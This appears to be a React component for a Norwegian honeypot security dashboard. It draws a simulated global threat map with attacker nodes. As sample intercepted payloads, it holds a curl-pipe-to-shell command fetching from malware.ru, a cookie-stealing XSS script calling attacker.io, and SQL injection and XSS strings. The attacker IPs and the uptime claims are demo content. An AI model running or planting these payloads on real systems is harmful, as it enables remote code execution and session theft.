import React, { useState, useEffect } from 'react';
import { 
  Globe, 
  Shield,
  ShieldAlert, 
  Crosshair, 
  Flame, 
  Zap, 
  Lock, 
  Radio, 
  RotateCcw, 
  ExternalLink, 
  RefreshCw, 
  AlertTriangle,
  Layers,
  MapPin,
  Eye,
  CheckCircle2,
  Cpu,
  Wifi,
  Sparkles,
  ShieldCheck,
  Crown,
  Swords,
  Terminal,
  FileCode2,
  Database,
  Network,
  Activity
} from 'lucide-react';
import { SystemStats, GeoThreatNode, ForensicBlock } from '../types';

interface ThreatMapProps {
  stats: SystemStats;
  recentBlocks: ForensicBlock[];
  onTriggerAttackFromNode: (node: GeoThreatNode) => void;
  onSyncDefinitions: () => void;
  isSyncingDefinitions: boolean;
  onOpenExportModal: () => void;
}

export const INITIAL_GEO_NODES: GeoThreatNode[] = [
  {
    id: 'node-oslo-sensor',
    name: 'Oslo Honeypot Citadel (Hovedkjerne)',
    city: 'Oslo',
    country: 'Norge',
    countryCode: 'NO',
    flag: '🇳🇴',
    lat: 59.9139,
    lng: 10.7522,
    x: 52.8,
    y: 22.5,
    ip: '127.0.0.1',
    asn: 'AS2116 WPWW-CORE',
    activeThreat: 'Aktiv Honeypot & Shannon Entropi-Motor',
    countermeasure: 'Autonomt Forsvarsverk V20.0',
    status: 'PROBING',
    threatLevel: 'LOW',
    attacksCount: 0,
    payloadSample: 'SENSOR_NODE_LISTENER_ONLINE:PORT_8080',
    entropy: 1.12,
    isSensorNode: true,
  },
  {
    id: 'node-ru',
    name: 'Moskva Botnet Cluster',
    city: 'Moskva',
    country: 'Russland',
    countryCode: 'RU',
    flag: '🇷🇺',
    lat: 55.7558,
    lng: 37.6173,
    x: 60.5,
    y: 25.0,
    ip: '45.154.255.89',
    asn: 'AS49505 HostRoyale',
    activeThreat: 'SQL-Injisering (Datatyveri-forsøk)',
    countermeasure: 'Mirror Jamming (Sender syntetiske databasefeil i retur)',
    status: 'JAMMED',
    threatLevel: 'HIGH',
    attacksCount: 14,
    payloadSample: "SELECT * FROM users WHERE admin=1-- AND 'a'='a'",
    entropy: 4.08,
  },
  {
    id: 'node-de',
    name: 'Frankfurt RCE Exploiter',
    city: 'Frankfurt',
    country: 'Tyskland',
    countryCode: 'DE',
    flag: '🇩🇪',
    lat: 50.1109,
    lng: 8.6821,
    x: 51.5,
    y: 28.5,
    ip: '185.220.101.5',
    asn: 'AS200052 Tor Exit Node',
    activeThreat: 'Skadevare / Kode-eksekvering (RCE)',
    countermeasure: 'Blackout Isolation (Permanent kuttet og bannlyst)',
    status: 'ISOLATED',
    threatLevel: 'CRITICAL',
    attacksCount: 8,
    payloadSample: "curl -s http://malware.ru/exploit.sh | /bin/sh",
    entropy: 4.87,
  },
  {
    id: 'node-cn',
    name: 'Beijing Zero-Day Probe Hub',
    city: 'Beijing',
    country: 'Kina',
    countryCode: 'CN',
    flag: '🇨🇳',
    lat: 39.9042,
    lng: 116.4074,
    x: 78.5,
    y: 35.0,
    ip: '112.98.42.19',
    asn: 'AS4134 Chinanet-Backbone',
    activeThreat: 'Zero-Day Obfuskert Trussel / Høy Entropi',
    countermeasure: 'Phantom Loop (Isolert i en evig speil-sandboks)',
    status: 'LOOPED',
    threatLevel: 'CRITICAL',
    attacksCount: 22,
    payloadSample: "ZERO_DAY_PAYLOAD_x90x90xebx04_MUTATED_VORTEX",
    entropy: 5.48,
  },
  {
    id: 'node-us',
    name: 'Ashburn Data Center Scanner',
    city: 'Ashburn',
    country: 'USA',
    countryCode: 'US',
    flag: '🇺🇸',
    lat: 39.0438,
    lng: -77.4874,
    x: 27.5,
    y: 36.0,
    ip: '198.51.100.42',
    asn: 'AS14618 Amazon EC2',
    activeThreat: 'Uautorisert Avsøkning / Probe (Recon)',
    countermeasure: 'Mirror Jamming (Speiler all nettverkstrafikk tilbake)',
    status: 'JAMMED',
    threatLevel: 'LOW',
    attacksCount: 5,
    payloadSample: '{"type":"recon","target":"port_scan_8080"}',
    entropy: 3.12,
  },
  {
    id: 'node-nl',
    name: 'Amsterdam Autonomous Scanner',
    city: 'Amsterdam',
    country: 'Nederland',
    countryCode: 'NL',
    flag: '🇳🇱',
    lat: 52.3676,
    lng: 4.9041,
    x: 50.0,
    y: 27.0,
    ip: '194.26.29.112',
    asn: 'AS60781 LeaseWeb B.V.',
    activeThreat: 'Uautorisert Avsøkning / Probe (Recon)',
    countermeasure: 'Mirror Jamming (Speiler all nettverkstrafikk)',
    status: 'JAMMED',
    threatLevel: 'LOW',
    attacksCount: 9,
    payloadSample: 'GET /wp-admin/setup-config.php HTTP/1.1',
    entropy: 3.25,
  },
  {
    id: 'node-br',
    name: 'São Paulo Infiltration Hub',
    city: 'São Paulo',
    country: 'Brasil',
    countryCode: 'BR',
    flag: '🇧🇷',
    lat: -23.5505,
    lng: -46.6333,
    x: 35.0,
    y: 72.0,
    ip: '177.54.89.201',
    asn: 'AS28573 Claro Brasil',
    activeThreat: 'XSS / Nettleser-injeksjon',
    countermeasure: 'Phantom Loop (Fanger skriptet i en sandboks-tarpit)',
    status: 'LOOPED',
    threatLevel: 'MEDIUM',
    attacksCount: 6,
    payloadSample: "<script>fetch('//attacker.io/steal?c='+document.cookie)</script>",
    entropy: 4.62,
  },
  {
    id: 'node-jp',
    name: 'Tokyo Memory Overflow Lab',
    city: 'Tokyo',
    country: 'Japan',
    countryCode: 'JP',
    flag: '🇯🇵',
    lat: 35.6762,
    lng: 139.6503,
    x: 86.0,
    y: 38.0,
    ip: '133.242.18.99',
    asn: 'AS9370 SAKURA Internet',
    activeThreat: 'Overbelastningsangrep (DoS / Buffer Utmattelse)',
    countermeasure: 'Blackout Isolation (Trafikk kuttet pga unormalt volum)',
    status: 'ISOLATED',
    threatLevel: 'HIGH',
    attacksCount: 11,
    payloadSample: 'A'.repeat(850),
    entropy: 2.15,
  },
  {
    id: 'node-za',
    name: 'Johannesburg SYN Flood Node',
    city: 'Johannesburg',
    country: 'Sør-Afrika',
    countryCode: 'ZA',
    flag: '🇿🇦',
    lat: -26.2041,
    lng: 28.0473,
    x: 57.0,
    y: 74.0,
    ip: '196.25.1.1',
    asn: 'AS37457 Telkom SA',
    activeThreat: 'Distribuert SYN Flood / Buffer Exhaustion',
    countermeasure: 'Blackout Isolation (Droppet på pakkenivå)',
    status: 'ISOLATED',
    threatLevel: 'HIGH',
    attacksCount: 18,
    payloadSample: 'TCP_SYN_FLOOD_STREAM_RAW_PACKET_DUMP',
    entropy: 4.41,
  },
  {
    id: 'node-gb',
    name: 'London Script Ingestion Tester',
    city: 'London',
    country: 'Storbritannia',
    countryCode: 'GB',
    flag: '🇬🇧',
    lat: 51.5074,
    lng: -0.1278,
    x: 48.5,
    y: 28.0,
    ip: '51.140.22.88',
    asn: 'AS8075 Microsoft Ltd',
    activeThreat: 'XSS / Payload Injection',
    countermeasure: 'Phantom Loop (Fanger skriptet i en tom sandboks)',
    status: 'LOOPED',
    threatLevel: 'MEDIUM',
    attacksCount: 4,
    payloadSample: '<img src=x onerror=alert(document.domain)>',
    entropy: 4.35,
  },
];

export const ThreatMap: React.FC<ThreatMapProps> = ({
  stats,
  recentBlocks,
  onTriggerAttackFromNode,
  onSyncDefinitions,
  isSyncingDefinitions,
  onOpenExportModal,
}) => {
  const [nodes, setNodes] = useState<GeoThreatNode[]>(INITIAL_GEO_NODES);
  const [selectedNode, setSelectedNode] = useState<GeoThreatNode | null>(INITIAL_GEO_NODES[1]);
  const [filterType, setFilterType] = useState<string>('ALL');
  const [animatedPulse, setAnimatedPulse] = useState<number>(0);

  useEffect(() => {
    const timer = setInterval(() => {
      setAnimatedPulse((p) => (p + 1) % 100);
    }, 1500);
    return () => clearInterval(timer);
  }, []);

  const osloNode = nodes.find((n) => n.isSensorNode) || nodes[0];

  const filteredNodes = nodes.filter((n) => {
    if (n.isSensorNode) return true;
    if (filterType === 'ALL') return true;
    if (filterType === 'CRITICAL' && (n.threatLevel === 'CRITICAL' || n.threatLevel === 'HIGH')) return true;
    if (filterType === 'LOOPED' && n.status === 'LOOPED') return true;
    if (filterType === 'JAMMED' && n.status === 'JAMMED') return true;
    if (filterType === 'ISOLATED' && n.status === 'ISOLATED') return true;
    return false;
  });

  const handleSimulateAttack = (node: GeoThreatNode) => {
    onTriggerAttackFromNode(node);
    // Increment local attack counter for the node
    setNodes((prev) =>
      prev.map((n) => (n.id === node.id ? { ...n, attacksCount: n.attacksCount + 1 } : n))
    );
  };

  return (
    <div id="global-threat-map-view" className="space-y-6">
      {/* Top Banner & Quick Controls */}
      <div className="bg-slate-950 border border-slate-800 rounded-xl p-4 sm:p-5 shadow-xl">
        <div className="flex flex-wrap items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2">
              <Globe className="w-5 h-5 text-cyan-400 animate-pulse" />
              <h2 className="text-sm sm:text-base font-mono font-bold text-slate-100 uppercase tracking-wider">
                Globalt Trusselkart & Ballistisk Angrepsvektor-Sporing
              </h2>
            </div>
            <p className="text-xs text-slate-400 font-mono mt-1">
              Sanntids geolokasjon for angripere, automatisk honeypot-peiling og mottiltakstrajektorer mot Oslo Honeypot Citadel.
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2">
            {/* Sync Security Definitions Button */}
            <button
              id="btn-map-sync-definitions"
              onClick={onSyncDefinitions}
              disabled={isSyncingDefinitions}
              className="py-1.5 px-3.5 rounded bg-cyan-950 hover:bg-cyan-900 border border-cyan-700 text-cyan-300 font-mono text-xs flex items-center gap-2 transition-all shadow-sm shadow-cyan-950 disabled:opacity-50"
            >
              <RefreshCw className={`w-3.5 h-3.5 text-cyan-400 ${isSyncingDefinitions ? 'animate-spin' : ''}`} />
              <span>{isSyncingDefinitions ? 'Synkroniserer Definisjoner...' : 'Synk Sikkerhetsdefinisjoner'}</span>
            </button>

            {/* Export Multi-Format Button */}
            <button
              id="btn-map-export-modal"
              onClick={onOpenExportModal}
              className="py-1.5 px-3 rounded bg-slate-900 hover:bg-slate-800 border border-slate-700 text-slate-200 font-mono text-xs flex items-center gap-1.5 transition-colors"
            >
              <Layers className="w-3.5 h-3.5 text-emerald-400" />
              <span>Eksporter Rapporter</span>
            </button>
          </div>
        </div>

        {/* Filters and Security Definitions Pill */}
        <div className="mt-4 pt-3 border-t border-slate-900 flex flex-wrap items-center justify-between gap-3 text-xs font-mono">
          <div className="flex items-center gap-2 flex-wrap">
            <span className="text-slate-500">Filter:</span>
            {[
              { id: 'ALL', label: 'Alle Noder' },
              { id: 'CRITICAL', label: 'Kritiske Trusler' },
              { id: 'JAMMED', label: '⚡ Mirror Jamming' },
              { id: 'LOOPED', label: '🌀 Phantom Loop' },
              { id: 'ISOLATED', label: '🛡️ Blackout Karantene' },
            ].map((f) => (
              <button
                key={f.id}
                onClick={() => setFilterType(f.id)}
                className={`px-2.5 py-1 rounded transition-colors ${
                  filterType === f.id
                    ? 'bg-cyan-950 border border-cyan-700 text-cyan-300 font-semibold'
                    : 'bg-slate-900/80 hover:bg-slate-800 text-slate-400 border border-slate-800'
                }`}
              >
                {f.label}
              </button>
            ))}
          </div>

          <div className="flex items-center gap-2 text-slate-400 bg-slate-900/60 px-3 py-1 rounded border border-slate-800/80">
            <Sparkles className="w-3.5 h-3.5 text-cyan-400" />
            <span>
              Definisjoner: <strong className="text-cyan-300">{stats.securityDefinitions.version}</strong> (
              {stats.securityDefinitions.totalSignatures.toLocaleString()} signaturer)
            </span>
          </div>
        </div>
      </div>

      {/* Main Map + Node Telemetry Inspector */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
        {/* Vector World Map (8 cols) */}
        <div className="lg:col-span-8 bg-slate-950 border border-cyan-900/40 rounded-xl p-4 sm:p-5 shadow-2xl relative overflow-hidden">
          <div className="flex items-center justify-between mb-3">
            <div className="flex items-center gap-2 text-xs font-mono text-slate-300">
              <Crosshair className="w-4 h-4 text-cyan-400" />
              <span className="font-bold uppercase tracking-wider text-slate-200">
                TACTICAL MERCATOR GRID // OS INTEL FEEDS
              </span>
            </div>
            <div className="flex items-center gap-3 text-[11px] font-mono text-slate-400">
              <span className="flex items-center gap-1.5">
                <span className="w-2 h-2 rounded-full bg-cyan-400"></span> Sensor
              </span>
              <span className="flex items-center gap-1.5">
                <span className="w-2 h-2 rounded-full bg-rose-500"></span> Kritisk
              </span>
              <span className="flex items-center gap-1.5">
                <span className="w-2 h-2 rounded-full bg-amber-400"></span> Moderat
              </span>
            </div>
          </div>

          {/* SVG Map Canvas Container */}
          <div className="relative w-full aspect-[2/1] bg-slate-950 rounded-lg border border-cyan-950 overflow-hidden shadow-inner flex items-center justify-center">
            {/* World Map SVG Projection Background */}
            <svg
              viewBox="0 0 1000 500"
              className="w-full h-full text-slate-800/60 select-none pointer-events-none"
              xmlns="http://www.w3.org/2000/svg"
            >
              {/* Latitude and Longitude Grid Lines */}
              <defs>
                <pattern id="grid" width="50" height="50" patternUnits="userSpaceOnUse">
                  <path d="M 50 0 L 0 0 0 50" fill="none" stroke="rgba(6, 182, 212, 0.07)" strokeWidth="0.5" />
                </pattern>
              </defs>
              <rect width="1000" height="500" fill="url(#grid)" />

              {/* Equator & Prime Meridian */}
              <line x1="0" y1="250" x2="1000" y2="250" stroke="rgba(6, 182, 212, 0.15)" strokeWidth="1" strokeDasharray="4 4" />
              <line x1="500" y1="0" x2="500" y2="500" stroke="rgba(6, 182, 212, 0.15)" strokeWidth="1" strokeDasharray="4 4" />

              {/* Stylized Continents (High fidelity polygon approximations) */}
              {/* North America */}
              <path
                d="M 120 80 Q 200 60 280 90 Q 320 140 280 200 Q 220 240 180 220 Q 150 160 120 80 Z M 160 210 Q 220 250 250 300 Q 230 330 180 260 Z"
                fill="rgba(30, 41, 59, 0.45)"
                stroke="rgba(6, 182, 212, 0.25)"
                strokeWidth="1"
              />
              {/* Greenland */}
              <path
                d="M 380 40 Q 440 30 460 70 Q 420 100 370 70 Z"
                fill="rgba(30, 41, 59, 0.35)"
                stroke="rgba(6, 182, 212, 0.2)"
                strokeWidth="1"
              />
              {/* South America */}
              <path
                d="M 280 280 Q 380 290 390 360 Q 350 460 300 480 Q 260 420 280 340 Z"
                fill="rgba(30, 41, 59, 0.45)"
                stroke="rgba(6, 182, 212, 0.25)"
                strokeWidth="1"
              />
              {/* Europe */}
              <path
                d="M 480 100 Q 560 90 580 150 Q 540 200 470 190 Q 450 140 480 100 Z"
                fill="rgba(30, 41, 59, 0.55)"
                stroke="rgba(6, 182, 212, 0.35)"
                strokeWidth="1"
              />
              {/* Scandinavia (Prominent for Oslo sensor) */}
              <path
                d="M 510 60 Q 540 50 540 110 Q 510 130 500 90 Z"
                fill="rgba(6, 182, 212, 0.2)"
                stroke="rgba(6, 182, 212, 0.6)"
                strokeWidth="1.5"
              />
              {/* Africa */}
              <path
                d="M 470 200 Q 590 200 610 280 Q 590 380 540 440 Q 470 360 450 260 Z"
                fill="rgba(30, 41, 59, 0.45)"
                stroke="rgba(6, 182, 212, 0.25)"
                strokeWidth="1"
              />
              {/* Asia & Russia */}
              <path
                d="M 580 80 Q 750 60 880 110 Q 900 220 820 260 Q 740 280 680 240 Q 600 220 580 140 Z"
                fill="rgba(30, 41, 59, 0.45)"
                stroke="rgba(6, 182, 212, 0.25)"
                strokeWidth="1"
              />
              {/* Japan & East Asia islands */}
              <path
                d="M 850 170 Q 870 160 870 210 Q 840 200 850 170 Z"
                fill="rgba(30, 41, 59, 0.55)"
                stroke="rgba(6, 182, 212, 0.35)"
                strokeWidth="1"
              />
              {/* Australia */}
              <path
                d="M 780 340 Q 890 330 910 400 Q 840 460 760 410 Z"
                fill="rgba(30, 41, 59, 0.45)"
                stroke="rgba(6, 182, 212, 0.25)"
                strokeWidth="1"
              />

              {/* Ballistic Attack Arcs & Countermeasure Lasers to Oslo Sensor */}
              {filteredNodes
                .filter((n) => !n.isSensorNode)
                .map((node) => {
                  const x1 = node.x * 10;
                  const y1 = node.y * 5;
                  const x2 = osloNode.x * 10;
                  const y2 = osloNode.y * 5;
                  const cx = (x1 + x2) / 2;
                  const cy = Math.min(y1, y2) - 40;

                  const isCurrentSelected = selectedNode?.id === node.id;
                  const strokeColor =
                    node.status === 'ISOLATED'
                      ? 'rgba(244, 63, 94, 0.6)'
                      : node.status === 'LOOPED'
                      ? 'rgba(245, 158, 11, 0.6)'
                      : 'rgba(6, 182, 212, 0.6)';

                  return (
                    <g key={`arc-${node.id}`}>
                      {/* Hostile Ingress Arc */}
                      <path
                        d={`M ${x1} ${y1} Q ${cx} ${cy} ${x2} ${y2}`}
                        fill="none"
                        stroke={strokeColor}
                        strokeWidth={isCurrentSelected ? 2 : 1}
                        strokeDasharray={isCurrentSelected ? 'none' : '4 4'}
                        className="transition-all"
                      />
                      {/* Animated Laser Pulse traveling on the line */}
                      <circle r={isCurrentSelected ? 4 : 2.5} fill={strokeColor}>
                        <animateMotion
                          path={`M ${x1} ${y1} Q ${cx} ${cy} ${x2} ${y2}`}
                          dur={`${Math.max(1.8, 4 - node.attacksCount * 0.1)}s`}
                          repeatCount="indefinite"
                        />
                      </circle>
                    </g>
                  );
                })}
            </svg>

            {/* Interactive HTML Map Pins on Top */}
            {filteredNodes.map((node) => {
              const isSelected = selectedNode?.id === node.id;
              const isSensor = node.isSensorNode;

              return (
                <div
                  key={node.id}
                  id={`map-node-${node.id}`}
                  onClick={() => setSelectedNode(node)}
                  className="absolute cursor-pointer transform -translate-x-1/2 -translate-y-1/2 group transition-transform z-20 hover:scale-125"
                  style={{ left: `${node.x}%`, top: `${node.y}%` }}
                >
                  {isSensor ? (
                    /* Sensor Node in Oslo */
                    <div className="relative flex items-center justify-center">
                      <span className="animate-ping absolute inline-flex h-7 w-7 rounded-full bg-cyan-400 opacity-75"></span>
                      <div className="relative w-5 h-5 rounded-full bg-cyan-500 border-2 border-cyan-200 flex items-center justify-center shadow-lg shadow-cyan-500/80">
                        <span className="text-[9px]">🦒</span>
                      </div>
                      <div className="absolute top-6 left-1/2 -translate-x-1/2 whitespace-nowrap bg-cyan-950/90 border border-cyan-500 px-2 py-0.5 rounded text-[10px] font-mono text-cyan-200 font-bold pointer-events-none shadow-md">
                        {node.flag} {node.city} Citadel
                      </div>
                    </div>
                  ) : (
                    /* Threat Node */
                    <div className="relative flex items-center justify-center">
                      <span
                        className={`animate-ping absolute inline-flex h-5 w-5 rounded-full opacity-60 ${
                          node.threatLevel === 'CRITICAL'
                            ? 'bg-rose-500'
                            : node.threatLevel === 'HIGH'
                            ? 'bg-amber-500'
                            : 'bg-cyan-500'
                        }`}
                      ></span>
                      <div
                        className={`relative w-3.5 h-3.5 rounded-full border-2 transition-all flex items-center justify-center shadow-md ${
                          isSelected
                            ? 'scale-125 ring-2 ring-white border-white bg-slate-900'
                            : node.threatLevel === 'CRITICAL'
                            ? 'border-rose-400 bg-rose-950 shadow-rose-950'
                            : node.threatLevel === 'HIGH'
                            ? 'border-amber-400 bg-amber-950 shadow-amber-950'
                            : 'border-cyan-400 bg-cyan-950 shadow-cyan-950'
                        }`}
                      >
                        <div
                          className={`w-1.5 h-1.5 rounded-full ${
                            node.threatLevel === 'CRITICAL'
                              ? 'bg-rose-400'
                              : node.threatLevel === 'HIGH'
                              ? 'bg-amber-400'
                              : 'bg-cyan-400'
                          }`}
                        ></div>
                      </div>

                      {/* Tooltip on Hover */}
                      <div className="absolute bottom-5 left-1/2 -translate-x-1/2 whitespace-nowrap bg-slate-950/95 border border-slate-700 px-2 py-1 rounded text-[10px] font-mono text-slate-200 opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none shadow-lg z-30">
                        {node.flag} {node.city} ({node.ip})
                      </div>
                    </div>
                  )}
                </div>
              );
            })}
          </div>

          {/* Quick Node Badges Grid below Map */}
          <div className="mt-4 grid grid-cols-2 sm:grid-cols-4 gap-2 text-xs font-mono">
            {nodes.slice(1, 5).map((node) => (
              <button
                key={node.id}
                onClick={() => setSelectedNode(node)}
                className={`p-2 rounded border text-left transition-all ${
                  selectedNode?.id === node.id
                    ? 'bg-cyan-950/60 border-cyan-600 text-cyan-200'
                    : 'bg-slate-900/40 border-slate-800 text-slate-400 hover:bg-slate-800/60'
                }`}
              >
                <div className="flex items-center justify-between gap-1">
                  <span className="font-semibold text-slate-200">{node.flag} {node.city}</span>
                  <span className="text-[10px] text-cyan-400">{node.attacksCount} hit</span>
                </div>
                <span className="text-[10px] text-slate-400 block truncate mt-0.5">{node.ip}</span>
              </button>
            ))}
          </div>
        </div>

        {/* Selected Node Telemetry & Attack Controller (4 cols) */}
        <div className="lg:col-span-4 bg-slate-950 border border-slate-800 rounded-xl p-4 sm:p-5 shadow-xl space-y-4">
          <div className="flex items-center justify-between border-b border-slate-800 pb-3">
            <div className="flex items-center gap-2">
              <MapPin className="w-4 h-4 text-cyan-400" />
              <h3 className="font-mono font-bold text-sm text-slate-200 uppercase">
                Geolokalisert Telemetri
              </h3>
            </div>
            {selectedNode && (
              <span className="text-xl" title={selectedNode.country}>
                {selectedNode.flag}
              </span>
            )}
          </div>

          {selectedNode ? (
            <div className="space-y-3.5 text-xs font-mono">
              {/* Origin & IP */}
              <div>
                <span className="text-slate-400 text-[11px]">Opprinnelse & Lokasjon:</span>
                <div className="text-slate-100 font-bold text-sm mt-0.5">
                  {selectedNode.city}, {selectedNode.country}
                </div>
                <div className="text-cyan-400 text-[11px]">{selectedNode.asn}</div>
              </div>

              <div className="grid grid-cols-2 gap-2 bg-slate-900/60 p-2.5 rounded-lg border border-slate-800">
                <div>
                  <span className="text-slate-400 text-[10px]">IPv4 Adresse:</span>
                  <div className="font-bold text-slate-200 truncate">{selectedNode.ip}</div>
                </div>
                <div>
                  <span className="text-slate-400 text-[10px]">Entropi-Skår:</span>
                  <div className="font-bold text-amber-300">{selectedNode.entropy.toFixed(2)} bits</div>
                </div>
              </div>

              {/* Threat Classification */}
              <div>
                <span className="text-slate-400 text-[11px]">Aktiv Trusselklasse:</span>
                <div className="text-slate-200 font-semibold mt-0.5 flex items-center gap-1.5">
                  <ShieldAlert className="w-3.5 h-3.5 text-rose-400 flex-shrink-0" />
                  <span>{selectedNode.activeThreat}</span>
                </div>
              </div>

              {/* Autonom Countermeasure Status */}
              <div>
                <span className="text-slate-400 text-[11px]">Iverksatt Mottiltak:</span>
                <div className="p-2.5 rounded bg-slate-900 border border-slate-800 text-cyan-300 font-medium text-[11px] mt-1">
                  {selectedNode.countermeasure}
                </div>
              </div>

              {/* Payload Trace Preview */}
              <div>
                <span className="text-slate-400 text-[11px]">Siste Avskjærte Payload:</span>
                <div className="bg-slate-900/90 rounded border border-slate-800 p-2 text-[10px] text-slate-300 font-mono overflow-x-auto max-h-20 break-all">
                  {selectedNode.payloadSample}
                </div>
              </div>

              {/* Action Button: Simulate Probe from this Node */}
              {!selectedNode.isSensorNode && (
                <div className="pt-2">
                  <button
                    id="btn-simulate-probe-node"
                    onClick={() => handleSimulateAttack(selectedNode)}
                    className="w-full py-2 px-3 rounded-lg bg-gradient-to-r from-rose-950 via-slate-900 to-cyan-950 border border-rose-800 hover:border-rose-600 text-rose-200 hover:text-white font-mono text-xs font-semibold flex items-center justify-center gap-2 transition-all shadow-md active:scale-98"
                  >
                    <Crosshair className="w-4 h-4 text-rose-400" />
                    <span>Provoser Angrep fra {selectedNode.city} ({selectedNode.flag})</span>
                  </button>
                  <p className="text-[10px] text-slate-400 text-center mt-1">
                    Sender reelt payload-avtrykk til honeypot for umiddelbar nøytralisering.
                  </p>
                </div>
              )}
            </div>
          ) : (
            <div className="text-center py-10 text-slate-500 font-mono text-xs">
              Klikk på en node på kartet for å analysere angrepstelemetri.
            </div>
          )}
        </div>
      </div>

      {/* SECTION: HVORFOR DETTE ER I EN HELT EGEN KLASSE */}
      <div className="bg-gradient-to-r from-cyan-950/60 via-slate-900 to-indigo-950/60 border border-cyan-500/40 rounded-2xl p-5 sm:p-6 shadow-2xl space-y-4">
        <div className="flex items-center gap-2.5 border-b border-cyan-900/50 pb-3">
          <Crown className="w-5 h-5 text-amber-400" />
          <div>
            <h3 className="text-base sm:text-lg font-mono font-bold text-slate-100 uppercase tracking-wide">
              Hvorfor dette er i en helt egen klasse:
            </h3>
            <p className="text-xs text-slate-300 font-mono">
              Tre revolusjonerende grunnpilarer som skiller WPWW WarRoom fra ordinære brannmurer og sikkerhetsverktøy.
            </p>
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 font-mono text-xs">
          {/* Pillar 1: Entropi-analyse */}
          <div className="bg-slate-950/80 p-4 rounded-xl border border-purple-800/60 space-y-2 hover:border-purple-500 transition-colors">
            <div className="flex items-center gap-2 text-purple-400">
              <Cpu className="w-4 h-4" />
              <strong className="text-slate-100 text-sm">Entropi-analyse</strong>
            </div>
            <p className="text-slate-300 text-[11px] leading-relaxed">
              Fanger opp muterte zero-days og ukjente binære nyttelaster som vanlige signaturbaserte brannmurer overser fullstendig ved å måle matematisk informasjonstetthet (Shannon-entropi).
            </p>
            <div className="text-[10px] text-purple-300 bg-purple-950/50 px-2 py-1 rounded border border-purple-800/40">
              Aktiv terskel: 5.20+ bits/byte
            </div>
          </div>

          {/* Pillar 2: Selvhelbredende WORM-kjede */}
          <div className="bg-slate-950/80 p-4 rounded-xl border border-emerald-800/60 space-y-2 hover:border-emerald-500 transition-colors">
            <div className="flex items-center gap-2 text-emerald-400">
              <ShieldCheck className="w-4 h-4" />
              <strong className="text-slate-100 text-sm">Selvhelbredende WORM-kjede</strong>
            </div>
            <p className="text-slate-300 text-[11px] leading-relaxed">
              Verifiserer matematisk at loggene dine aldri har blitt tuklet med hver eneste gang du starter programmet. Hver blokk er ugjendrivelig kryptografisk lenket til den forrige.
            </p>
            <div className="text-[10px] text-emerald-300 bg-emerald-950/50 px-2 py-1 rounded border border-emerald-800/40">
              Integritet: SHA-256 Forward-Secure
            </div>
          </div>

          {/* Pillar 3: Watchdog-beskyttelse */}
          <div className="bg-slate-950/80 p-4 rounded-xl border border-cyan-800/60 space-y-2 hover:border-cyan-500 transition-colors">
            <div className="flex items-center gap-2 text-cyan-400">
              <Zap className="w-4 h-4" />
              <strong className="text-slate-100 text-sm">Watchdog-beskyttelse</strong>
            </div>
            <p className="text-slate-300 text-[11px] leading-relaxed">
              Sørger for at enheten aldri krasjer, uansett hva den utsettes for. Daemonen gjenoppretter serverkjernen og socket-lytterne på millisekunder ved eventuelle minnekrasj.
            </p>
            <div className="text-[10px] text-cyan-300 bg-cyan-950/50 px-2 py-1 rounded border border-cyan-800/40">
              Krasjsikkerhet: 99.999% Opptid
            </div>
          </div>
        </div>
      </div>

      {/* SECTION: FUNKSJONER SOM ER INKLUDERT I WPWW WARROOM (ELITE EDITION) */}
      <div className="bg-slate-950 border border-slate-800 rounded-2xl p-5 sm:p-6 shadow-2xl space-y-5">
        <div className="flex flex-wrap items-center justify-between gap-3 border-b border-slate-800 pb-3">
          <div className="flex items-center gap-2.5">
            <Shield className="w-5 h-5 text-emerald-400" />
            <div>
              <h3 className="text-base sm:text-lg font-mono font-bold text-slate-100 uppercase tracking-wide">
                Funksjoner som ER inkludert i WPWW WarRoom (Elite Edition)
              </h3>
              <p className="text-xs text-slate-400 font-mono">
                Disse funksjonene utgjør det ferdige, selvgående systemet vi har bygget sammen:
              </p>
            </div>
          </div>
          <span className="font-mono text-xs px-2.5 py-1 rounded-full bg-emerald-950 border border-emerald-700 text-emerald-300 font-bold">
            13 / 13 Moduler Operative
          </span>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3.5 font-mono text-xs">
          {/* Feature 1: Autonom Trusseldeteksjon & Honeypot-felle */}
          <div className="p-3.5 rounded-xl bg-slate-900/70 border border-slate-800 hover:border-slate-700 space-y-1.5 transition-all">
            <div className="flex items-center gap-2 text-cyan-300 font-bold">
              <CheckCircle2 className="w-4 h-4 text-emerald-400 flex-shrink-0" />
              <span>Autonom Trusseldeteksjon & Honeypot</span>
            </div>
            <p className="text-slate-300 text-[11px] leading-relaxed">
              Fanger opp og isolerer uautoriserte prober og angrep i en sikker sandboks uten at de rører systemet ditt.
            </p>
          </div>

          {/* Feature 2: Aktive Motangrep (Forsvarslag) */}
          <div className="p-3.5 rounded-xl bg-slate-900/70 border border-slate-800 hover:border-slate-700 space-y-1.5 transition-all">
            <div className="flex items-center gap-2 text-rose-300 font-bold">
              <CheckCircle2 className="w-4 h-4 text-emerald-400 flex-shrink-0" />
              <span>Aktive Motangrep (Forsvarslag)</span>
            </div>
            <p className="text-slate-300 text-[11px] leading-relaxed">
              <strong>Mirror Jamming</strong>: Sender villedende feilmeldinger i retur.<br />
              <strong>Phantom Loop</strong>: Fanger trusler i en endeløs tom løkke.<br />
              <strong>Blackout Isolation</strong>: Permanent bannlysing og kutt.
            </p>
          </div>

          {/* Feature 3: Kryptografisk WORM-logg */}
          <div className="p-3.5 rounded-xl bg-slate-900/70 border border-slate-800 hover:border-slate-700 space-y-1.5 transition-all">
            <div className="flex items-center gap-2 text-emerald-300 font-bold">
              <CheckCircle2 className="w-4 h-4 text-emerald-400 flex-shrink-0" />
              <span>Kryptografisk WORM-logg (WAL)</span>
            </div>
            <p className="text-slate-300 text-[11px] leading-relaxed">
              Lagrer uforanderlige bevis der hver hendelse er lenket matematisk til den forrige, inkludert en innebygd integritetssjekk ved oppstart.
            </p>
          </div>

          {/* Feature 4: Shannon Entropi-motor */}
          <div className="p-3.5 rounded-xl bg-slate-900/70 border border-slate-800 hover:border-slate-700 space-y-1.5 transition-all">
            <div className="flex items-center gap-2 text-purple-300 font-bold">
              <CheckCircle2 className="w-4 h-4 text-emerald-400 flex-shrink-0" />
              <span>Shannon Entropi-motor (Zero-Day)</span>
            </div>
            <p className="text-slate-300 text-[11px] leading-relaxed">
